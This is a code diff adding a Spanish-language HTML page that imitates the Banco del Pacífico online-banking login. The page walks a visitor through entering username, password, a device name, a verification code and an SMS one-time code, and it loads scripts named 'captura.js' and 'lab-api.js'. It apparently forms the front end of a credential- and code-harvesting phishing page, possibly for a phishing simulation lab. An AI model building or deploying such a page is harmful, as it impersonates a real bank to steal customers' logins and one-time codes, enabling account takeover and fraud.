@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>Banco del Pacífico</title>
+  <link rel="shortcut icon" href="../assets/icons/pacifico.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../styles/personas.css">
+</head>
+<body data-titulo="titulo">
+  <div class="pfl-layout">
+    <section class="pfl-access" aria-label="Ingreso a banca virtual personas">
+      <div class="pfl-access__inner">
+        <a class="pfl-wordmark-link" href="../index.html" aria-label="Banco del Pacífico">
+          <img class="pfl-wordmark" src="../assets/images/personas-wordmark.webp" alt="Banco del Pacífico">
+        </a>
+        <div class="pfl-card" data-step="user">
+          <div class="pfl-step pfl-step--user">
+            <h1 class="pfl-card__title" data-t="bienvenida"></h1>
+            <form class="pfl-form pfl-form--user" action="" method="get" autocomplete="off" novalidate>
+              <label class="pfl-field" for="pfl-user">
+                <span class="pfl-field__label" data-t="ingresa-usuario"></span>
+                <input class="pfl-field__input" id="pfl-user" name="usuario" type="text" autocomplete="username">
+                <span class="pfl-field__line" aria-hidden="true"></span>
+              </label>
+              <button class="pfl-submit" type="submit" disabled data-t="continuar"></button>
+              <button class="pfl-action" type="button" data-pfl-info="unlock" data-t="desbloquear"></button>
+              <button class="pfl-action pfl-action--plain" type="button" data-pfl-info="recover" data-t="olvidaste"></button>
+              <div class="pfl-tiles">
+                <button class="pfl-tile pfl-tile--wide" type="button" data-pfl-info="create">
+                  <img src="../assets/icons/personas-user.svg" alt="">
+                  <span data-t="crear-usuario"></span>
+                </button>
+                <button class="pfl-tile pfl-tile--narrow" type="button" data-pfl-info="products">
+                  <img src="../assets/icons/personas-card.svg" alt="">
+                  <span data-t="solicitar-productos"></span>
+                </button>
+              </div>
+              <p class="pfl-error pfl-error--user" hidden></p>
+            </form>
+          </div>
+
+          <div class="pfl-step pfl-step--password" hidden>
+            <button class="pfl-back" type="button" data-t-aria="volver-usuario" aria-label="Volver al usuario">
+              <img src="../assets/icons/personas-back.svg" alt="">
+            </button>
+            <div class="pfl-avatar">
+              <img class="pfl-avatar__image" src="../assets/icons/personas-avatar.svg" alt="">
+              <p class="pfl-avatar__name" data-user-name></p>
+            </div>
+            <form class="pfl-form pfl-form--password" action="" method="get" autocomplete="off" novalidate>
+              <label class="pfl-field pfl-field--password" for="pfl-password">
+                <span class="pfl-field__label pfl-field__label--plain" data-t="ingresa-clave"></span>
+                <input class="pfl-field__input" id="pfl-password" name="clave" type="password" autocomplete="current-password">
+                <span class="pfl-field__line" aria-hidden="true"></span>
+                <button class="pfl-eye" type="button" aria-label="Mostrar contraseña">
+                  <img src="../assets/icons/personas-eye-off.svg" alt="">
+                </button>
+              </label>
+              <button class="pfl-submit" type="submit" disabled data-t="iniciar-sesion"></button>
+              <button class="pfl-action" type="button" data-pfl-info="unlock" data-t="desbloquear"></button>
+              <button class="pfl-action pfl-action--plain" type="button" data-pfl-info="recover" data-t="olvidaste"></button>
+              <p class="pfl-error pfl-error--login" hidden></p>
+            </form>
+          </div>
+
+          <div class="pfl-step pfl-step--device" hidden>
+            <img class="pfl-step__icon" src="../assets/icons/personas-device-lock.svg" alt="">
+            <h1 class="pfl-step__title" data-t="registrar-dispositivo"></h1>
+            <p class="pfl-step__text" data-t="texto-dispositivo"></p>
+            <form class="pfl-form pfl-form--flow" action="" method="get" novalidate>
+              <label class="pfl-field" for="pfl-device">
+                <span class="pfl-field__label pfl-field__label--plain" data-t="nombre-dispositivo"></span>
+                <input class="pfl-field__input" id="pfl-device" name="dispositivo" type="text" autocomplete="off">
+                <span class="pfl-field__line" aria-hidden="true"></span>
+              </label>
+              <button class="pfl-submit" type="submit" disabled data-t="continuar"></button>
+              <button class="pfl-action pfl-action--cancel" type="button" data-t="cancelar"></button>
+            </form>
+          </div>
+
+          <div class="pfl-step pfl-step--code" hidden>
+            <img class="pfl-step__icon" src="../assets/icons/personas-code-shield.svg" alt="">
+            <h1 class="pfl-step__title" data-t="ingresa-codigo"></h1>
+            <p class="pfl-step__text" data-t="texto-codigo"></p>
+            <form class="pfl-form pfl-form--flow" action="" method="get" novalidate>
+              <label class="pfl-field" for="pfl-code">
+                <span class="pfl-field__label pfl-field__label--plain" data-t="codigo-verificacion"></span>
+                <input class="pfl-field__input" id="pfl-code" name="codigo" type="text" inputmode="numeric" autocomplete="one-time-code">
+                <span class="pfl-field__line" aria-hidden="true"></span>
+              </label>
+              <button class="pfl-submit" type="submit" disabled data-t="continuar"></button>
+              <button class="pfl-action pfl-action--cancel" type="button" data-t="cancelar"></button>
+              <p class="pfl-error pfl-error--code" hidden></p>
+            </form>
+          </div>
+
+          <div class="pfl-step pfl-step--sms" hidden>
+            <img class="pfl-step__icon" src="../assets/icons/personas-code-shield.svg" alt="">
+            <h1 class="pfl-step__title" data-t="titulo-sms"></h1>
+            <p class="pfl-step__text" data-t="texto-sms"></p>
+            <form class="pfl-form pfl-form--flow" action="" method="get" novalidate>
+              <label class="pfl-field" for="pfl-sms-code">
+                <span class="pfl-field__label pfl-field__label--plain" data-t="codigo-activacion"></span>
+                <input class="pfl-field__input" id="pfl-sms-code" name="codigoSms" type="text" autocomplete="one-time-code">
+                <span class="pfl-field__line" aria-hidden="true"></span>
+              </label>
+              <button class="pfl-submit" type="submit" disabled data-t="continuar"></button>
+              <button class="pfl-action pfl-action--cancel" type="button" data-t="cancelar"></button>
+              <p class="pfl-error pfl-error--sms" hidden></p>
+            </form>
+          </div>
+        </div>
+        <p class="pfl-browser" data-t="navegadores"></p>
+        <p class="pfl-copy" data-t="copyright"></p>
+      </div>
+      <div class="pfl-loading" hidden aria-live="polite">
+        <div class="pfl-spinner" aria-hidden="true"></div>
+        <p data-t="cargando"></p>
+      </div>
+    </section>
+    <aside class="pfl-tips" aria-label="Consejos de seguridad">
+      <div class="pfl-tips__inner">
+        <p class="pfl-eyebrow" data-t="consejos"></p>
+        <h2 class="pfl-tips__title" data-t="por-tu-seguridad"></h2>
+        <div class="pfl-tips__body">
+          <div class="pfl-tip">
+            <img src="../assets/icons/personas-lock.svg" alt="">
+            <p data-t="consejo-1"></p>
+          </div>
+          <div class="pfl-tip">
+            <img src="../assets/icons/personas-key.svg" alt="">
+            <p data-t="consejo-2"></p>
+          </div>
+          <div class="pfl-tip">
+            <img src="../assets/icons/personas-info.svg" alt="">
+            <p data-t="consejo-3"></p>
+          </div>
+          <div class="pfl-tip">
+            <img src="../assets/icons/personas-phone.svg" alt="">
+            <p data-t="consejo-4"></p>
+          </div>
+        </div>
+        <h2 class="pfl-help-title" data-t="necesitas-ayuda"></h2>
+        <a class="pfl-help-link" href="https://www.bancodelpacifico.com/que-necesitas/tutoriales/banca-virtual-intermatico/crear-usuario" target="_blank" rel="noreferrer" data-t="ayuda-1"></a>
+        <a class="pfl-help-link" href="https://www.bancodelpacifico.com/que-necesitas/Tutoriales" target="_blank" rel="noreferrer" data-t="ayuda-2"></a>
+        <a class="pfl-help-link" href="https://www.bancodelpacifico.com/que-necesitas/Tutoriales" target="_blank" rel="noreferrer" data-t="ayuda-3"></a>
+      </div>
+    </aside>
+  </div>
+  <script src="../scripts/textos.js"></script>
+  <script src="../scripts/captura.js"></script>
+  <script src="../scripts/lab-api.js"></script>
+  <script src="../scripts/personas.js"></script>
+</body>
+</html>
